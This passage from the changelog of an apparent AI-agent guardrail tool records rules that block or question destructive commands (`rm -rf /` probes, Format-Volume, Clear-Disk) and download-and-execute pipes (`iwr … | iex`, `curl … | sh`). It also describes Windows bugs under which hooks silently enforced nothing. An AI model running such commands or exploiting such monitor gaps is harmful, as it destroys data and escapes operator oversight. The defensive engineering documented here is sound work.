  `test/adversarial` is POSIX-shaped and its harness builds the probe binary
  without a `.exe` suffix.
- **`internal/policy` joins the Windows job, and its tests stop reading the
  operator's real config.** `writeOperatorConfig` and three merge tests
  sandboxed only `XDG_CONFIG_HOME`, but `operatorConfigDir` reads `APPDATA`
  on Windows — so on a Windows host these tests were loading
  `%APPDATA%\guardrail\waivers.toml`, the machine's actual operator grants.
  Non-hermetic, and the reason the package could not join the job. With both
  roots sandboxed and four grant paths spelled host-absolutely (grant matching
  requires `filepath.IsAbs`, and `/repo` is absolute only on POSIX), all seven
  filter-selected policy tests pass on Windows.
- **Fix: `guardrail selftest` passes on a Windows host.** Both codex probes
  carried a hardcoded `/tmp` cwd, which is a relative path on Windows, so
  codex's fail-closed adapter rejected them as unparseable — the plane's
  selftest reported nothing about enforcement either way. Their cwd is now
  `os.TempDir()` and the destructive probe spells the filesystem root the way
  the host does (`rm -rf /` is a cwd-relative delete on Windows). The claude
  probe count is read from the matrix instead of hardcoded at 7, which a
  Windows host exceeds. Six Windows test failures fixed; the whole matrix now
  has a `Windows`-named regression guard, because CI's windows job selects
  tests by name and could not see any of this.
- **PowerShell destructive cmdlets are covered (#111, P1)**: `Remove-Item`
  and its aliases project onto the `rm` rule — one containment decision,
  one waiver, both spellings — honouring `-WhatIf`, parameter prefixes
  (`-rec`, `-fo`), `-Path`/`-LiteralPath` binding, and leaving POSIX
  `rmdir` to `P1.rmdir`. `Format-Volume`/`Clear-Disk`/`Remove-Partition`/
  `Initialize-Disk` join the `P1.mkfs` family; `Set-ExecutionPolicy
  Bypass|Unrestricted` asks. Measured before: every one allowed.
  P4's secret tier already covered cmdlets — it keys on operands, not
  command names — so #111's P4 premise was wrong.
- **PowerShell egress and dynamic eval are covered (#111, P6)**:
  `Invoke-WebRequest`/`Invoke-RestMethod` and their aliases join the
  egress allowlist, the download-pipe-shell walk (`iwr … | iex` is
  `curl … | sh`), and P7's network signal; `-Uri` binds the destination
  and every other value-taking parameter consumes its own argument, so
  `-OutFile payload.exe` is a file and not a host. Bare
  `Invoke-Expression` asks under a new `P6.dynamic-eval`: its argument is
  PowerShell source, and reading it with a POSIX shell parser would be a
  guess. Parity with `curl` is asserted, including for destinations the
  analyser cannot read. **#111's enforcement gap is closed.**
- **`guardrail selftest --evidence claude`**: registration is a claim, an audit
  record is evidence. ADR-0020 built this gate for codex; #149 showed claude
  needed it just as badly — a hook that registered and could not spawn read as
  green in `doctor` for four days while nothing was enforced. The gate opens on
  two distinct pre-hook records from one real session, and `doctor`'s claude
  line now reads "registered but NEVER OBSERVED FIRING" until it does. On the
  machine that found #149 it reports `claude=2774 synthetic=2774 eligible=0` —
  every claude record in the log was a fixture or a probe.
  Unlike codex's explicit prefix denylist, the claude gate requires a
  UUID-shaped session id: claude's fixture ids are ad-hoc (`night-claude`,
  `trifecta-sess-1`, `../unsafe`, `c1`), a denylist that misses one opens the
  gate falsely, and that is the failure class the gate exists to catch. The
  caveat is operator-facing only — it stays out of the lifecycle's ownership
  string and the SessionStart line, because a newly enrolled plane has no
  records yet and is not drifted. The scanner is shared with codex's gate,
  which keeps every count, the exact-session filter and the expected-tool
  assertions #165 added.
- **Fix (P0, #149): claude and antigravity hooks could not spawn on Windows.**
  `gen-config` concatenated the bare binary path, so the floor registered
  `C:\Users\u\.local\bin\guardrail.exe hook claude`. A POSIX shell reads every
  backslash as an escape, the spawn failed as `command not found`, and a
  PreToolUse hook that cannot spawn is a silent no-op — registered, green in
  `doctor`, enforcing nothing. Measured on a Windows host: **not one real
  Claude Code session in 3,896 audit records across four days**, while
  opencode and antigravity (which spawn the binary directly, with no shell)
  were mediated normally. All hooked planes now render through one
  `HookCommand`: Windows paths as `"C:/…/guardrail.exe"` (double quotes and
  forward slashes, the spelling cmd.exe and POSIX shells both accept), and a
  POSIX word quoted only when a shell would act on it. **POSIX output is
  unchanged** — `guardrail hook claude` and `/usr/local/bin/guardrail hook
  claude` still render exactly as before, so no existing floor drifts and the
  distinction that only opencode pins an absolute binary is preserved. codex
  is untouched: it already quoted correctly, and its Windows spelling goes
  through the `commandWindows` key its runtime supports.
- **`doctor` no longer reports green for a hook it cannot spawn.** Registration
  and execution are different claims, and only the first was ever checked. A
  floor whose command is an unquoted path containing a backslash or a space now
  reads "guardrail hook registered but CANNOT SPAWN — … Nothing is being
  enforced".
- **macOS is a first-class platform**: CI runs the full POSIX suite on
  ubuntu, windows, and macos. Two real engine bugs fixed (temp-root
  symlink divergence, operator-config grant matching); symlink-escape
  detection now file-identity-based and spelling-tolerant; concurrent
  grant fixtures stress-verified (100 runs).

## v0.20.26-dev
- Read-only guardrail status is allowed from sessions (exact three-word
  command, everything adjacent still denied); ADR-0021 records the Windows
  approval broker design (named pipe, owner-only DACL, lift order a-d).

## v0.20.25-dev
- ADR-0019 updated with the REPL/JavaScript mediation probe (Deny stands,
  upgrade condition recorded); claude selftest probes expanded to 7
  (serena MCP deny, delegation allow, external ask); docs/OPERATIONS.md
  runbook born.

## v0.20.24-dev
- Antigravity selftest probes expanded to 7: delegation, timer typing,
  MCP registry projection, meta-dispatch. Every ADR invariant is now
  behaviorally pinned (0013/0017/0018/0019).

## v0.20.23-dev
- guardrail selftest --evidence codex: live-mediation evidence gate
  (ADR-0020) — two distinct post-binary records in one non-synthetic
  session opens the approval-flow ADR precondition.

## v0.20.21-dev
- CHANGELOG catch-up (this release's actual change).

## v0.20.20-dev
- **Fix:** post-update verification (doctor + selftest) execs the freshly
  installed binary instead of running in-process — the running process is
  still the superseded release and recorded passes for the wrong version.
  Same hazard class as the daemon shutdown fix in v0.19.11.

## v0.20.19-dev
- `guardrail update` names the release-asset race: a 404 right after tagging
  says "assets may still be publishing; retry in a minute".

## v0.20.18-dev
- SessionStart asks for a selftest until one passes on the installed release
  (marker records the release that passed, operator-owned); `guardrail update`
  runs doctor + selftest on the new binary.

## v0.20.17-dev
- `guardrail audit`: whole-history summary across rotated segments; audit
  rotation at 20MB keeping 3; selftest idempotent across repeated runs
  (unique session IDs); hygiene bundle (gitignore graft/.serena, CI sows
  /tmp/.git, package test HOME sandbox, CHANGELOG born).

## v0.20.16-dev
- `guardrail selftest`: embedded probe matrix verifies installed enforcement
  behavior per plane (allow/deny/night-preserved asks, MCP projection).

## v0.20.15-dev
- `doctor --coverage codex --schema <path>`: schema-driven coverage inventory
  (codex plane).

## v0.20.14-dev
_(skipped; tag reused during integration)_

## v0.20.13-dev
- **Fix (P0):** genconfig emits `planecontract` hook matchers, not stale
  copies — `plane enable` can no longer regress live `*` matchers.
- `doctor --coverage antigravity`: MCP config + session declaration inventory.
- ADR-0019: static boundary verification vs dynamic meta-dispatch.

## v0.20.12-dev
- `doctor --coverage claude`: scans the installed Claude Code bundle;
  surfaced and contracted `SendUserMessage` (SafeControl) and
  `JavaScript`/`REPL` (Deny, unverified mediation).

## v0.20.11-dev
- `guardrail approvals list|approve <id>`; request TTL 5→15 minutes. The
  socket can present a ceremony but never complete one (invariant preserved).

## v0.20.10-dev
- **Fix (P0):** night mode never relaxes outward-reach asks
  (`capability-external`, `capability-web-search`, `unknown-native-tool`).
- Claude unknown-tool posture: allow → ask. ADR-0018 (External tier).

## v0.20.9-dev
- MCP registry: pathless read queries scope to the working directory;
  mutations keep required-path fail-closed.

## v0.20.8-dev
- MCP family registry (serena, graft) with argument projection; opencode
  unknown tools ask instead of allowing. ADR-0017. Closes the coverage-audit
  finding that MCP mutations ran with zero path evaluation.

## v0.20.7-dev
- Antigravity `schedule` typing: one-shot timers allow, cron/ambiguous ask.

## v0.20.6-dev
- Text-mention taxonomy (`P4.secret-in-text`, NightMentionReason): Deny with
  Write/Edit redirection instead of dead-end guidance.

## v0.20.5-dev
- **Fix:** plane enable treats a stale permissions floor as drift and
  re-merges (ground-truth comparison).

## v0.20.4-dev
- Approved grants are applied by the broker and never re-run;
  `operator-action-satisfied` short-circuit. Codex mediation probes.

## v0.20.3-dev
- **Fix:** repo discovery stops at the System temp root boundary
  (`GIT_CEILING_DIRECTORIES` + engine walk); the `/tmp/.git` lesson.

## v0.20.2-dev
- Antigravity native parity: typed paths, drift hardening, delegation
  allowed with runtime evidence (ADR-0013).

## v0.20.1-dev
- Claude parity: MultiEdit/NotebookEdit evaluate every path;
  `CapabilityExternal` for blanket-denied tools; egress terminal command.

## v0.20.0-dev
- **Codex becomes a Guardrail plane**: contract, adapter, native escalation
  floor (ADR-0016), lifecycle, diagnostics. Unknown tools fail closed.

## v0.19.13-dev
- `guardrail recover <repair>`: predefined, WebAuthn-gated repairs for
  protected machinery with timestamped backups.

## v0.19.12-dev
- OpenCode asks answered by the host permission dialog (ADR-0015); retry
  inference demoted to fallback.

## v0.19.11-dev
- Help alignment; `guardrail update` retires a live approval daemon (no
  superseded-code window).

## v0.19.10-dev
- Help decluttering; plane lifecycle absorbs unmarked legacy hook groups.

## v0.19.9-dev
- **Fix:** unmarked-entry detection matches every guardrail binary form
  (`.test`, `.exe`, absolute paths); structural test HOME sandbox for plane
  tests.

## v0.19.8-dev
- **Fix:** enable absorbs unmarked legacy Claude hook groups; reconciliation
  treats their presence as drift.

## v0.19.7-dev
- **Fix:** plane CLI observes the broker's `completed` terminal status (the
  hang); help column alignment.

## v0.19.6-dev
- Batched egress grants: one passkey for an exact domain list, all-or-nothing
  application.

## v0.19.5-dev
- Delegation allowed on planes with in-process enforcement (ADR-0013);
  typed `apply_patch` path extraction; `guardrail update`.

## v0.19.4-dev
- Same-version `guardrail update` is a verified no-op.

## v0.19.3-dev
- Plane lifecycle batches into one approval; steady state prompts nobody.

## v0.19.2-dev
- Actionable per-rule Deny guidance across all planes.

## v0.19.1-dev
- `guardrail plane status|enable|disable` lifecycle (WebAuthn-gated,
  ownership-safe removal).

## v0.19.0-dev
- WebAuthn operator approvals: broker, browser ceremony, audit attribution.
